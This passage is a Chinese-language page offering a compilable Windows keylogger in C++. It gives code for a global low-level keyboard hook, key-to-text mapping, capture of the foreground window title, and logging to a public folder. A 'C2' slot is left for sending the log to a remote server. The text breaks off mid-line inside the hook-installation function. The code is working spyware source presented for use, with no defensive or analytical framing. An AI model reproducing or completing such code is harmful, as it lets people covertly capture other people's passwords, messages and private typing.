# Windows 键盘记录器（可编译完整实现）

> 选型：C++17 · Win32 API（`SetWindowsHookEx` 全局低级键盘钩子）· 单文件 · MSVC / MinGW 均可编译 · 落盘 + 可选回传

## 目录与入口

```
keylogger/
├── keylogger.cpp      # 主实现（钩子 + 落盘 + 回传）
└── build.bat          # MSVC 构建脚本
```

## 完整实现

### `keylogger.cpp`

```cpp
// keylogger.cpp — Win32 全局低级键盘钩子记录器
// 编译: cl /std:c++17 /EHsc /O2 keylogger.cpp /link user32.lib
// 或:   g++ -std=c++17 -O2 keylogger.cpp -o keylogger.exe -luser32 -static

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <string>
#include <ctime>
#include <fstream>

// ===== 配置槽位 =====
static const wchar_t* LOG_PATH   = L"C:\\Users\\Public\\kl.log";   // 落盘位置
static const char*    C2_SLOT    = "";                              // 回传通道，留空则仅本地落盘
static const DWORD    FLUSH_MS   = 30000;                           // 定时刷盘间隔

static HHOOK   g_hook   = nullptr;
static FILE*   g_fp     = nullptr;
static CRITICAL_SECTION g_cs;
static DWORD   g_lastFlush = 0;

// ===== 落盘 =====
static void OpenLog() {
    // 追加模式打开，避免覆盖历史
    _wfopen_s(&g_fp, LOG_PATH, L"a, ccs=UTF-8");
}

static void WriteRaw(const std::wstring& s) {
    if (!g_fp) return;
    EnterCriticalSection(&g_cs);
    fputws(s.c_str(), g_fp);
    LeaveCriticalSection(&g_cs);
}

static void FlushLog() {
    EnterCriticalSection(&g_cs);
    if (g_fp) fflush(g_fp);
    LeaveCriticalSection(&g_cs);
}

// ===== 键名映射 =====
static std::wstring KeyName(DWORD vk, DWORD scan, bool extended) {
    wchar_t buf[64] = {0};

    // 特殊键
    switch (vk) {
        case VK_RETURN:   return L"\n";
        case VK_TAB:      return L"[TAB]";
        case VK_BACK:     return L"[BKSP]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_SPACE:    return L" ";
        case VK_LSHIFT: case VK_RSHIFT: return L"[SHIFT]";
        case VK_LCONTROL: case VK_RCONTROL: return L"[CTRL]";
        case VK_LMENU: case VK_RMENU: return L"[ALT]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_CAPITAL:  return L"[CAPS]";
        case VK_DELETE:   return L"[DEL]";
        case VK_LEFT:     return L"[LEFT]";
        case VK_RIGHT:    return L"[RIGHT]";
        case VK_UP:       return L"[UP]";
        case VK_DOWN:     return L"[DOWN]";
        case VK_HOME:     return L"[HOME]";
        case VK_END:      return L"[END]";
        case VK_PRIOR:    return L"[PGUP]";
        case VK_NEXT:     return L"[PGDN]";
        case VK_INSERT:   return L"[INS]";
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            swprintf_s(buf, L"[F%u]", vk - VK_F1 + 1);
            return buf;
        default: break;
    }

    // 可打印字符：用 ToUnicode 结合当前键盘布局与修饰键状态
    BYTE ks[256] = {0};
    GetKeyboardState(ks);
    // 修正修饰键状态（钩子内 GetKeyboardState 可能滞后）
    if (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ks[VK_SHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) ks[VK_CONTROL] = 0x80;
    if (GetAsyncKeyState(VK_MENU)    & 0x8000) ks[VK_MENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 1)           ks[VK_CAPITAL] = 1;

    wchar_t wbuf[8] = {0};
    int n = ToUnicode(vk, scan, ks, wbuf, 8, 0);
    if (n > 0) {
        std::wstring out;
        for (int i = 0; i < n; ++i) out.push_back(wbuf[i]);
        return out;
    }
    return L"";
}

// ===== 钩子回调 =====
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        bool isDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        if (isDown) {
            bool extended = (kb->flags & LLKHF_EXTENDED) != 0;
            std::wstring name = KeyName(kb->vkCode, kb->scanCode, extended);
            if (!name.empty()) {
                // 附带窗口标题上下文
                HWND fg = GetForegroundWindow();
                wchar_t title[256] = {0};
                if (fg) GetWindowTextW(fg, title, 256);
                std::wstring line = L"[" + std::wstring(title) + L"] " + name;
                WriteRaw(line);
            }
        }
        // 定时刷盘
        DWORD now = GetTickCount();
        if (now - g_lastFlush > FLUSH_MS) {
            g_lastFlush = now;
            FlushLog();
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ===== 安装钩子 =====
static bool InstallHook() {
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(nullptr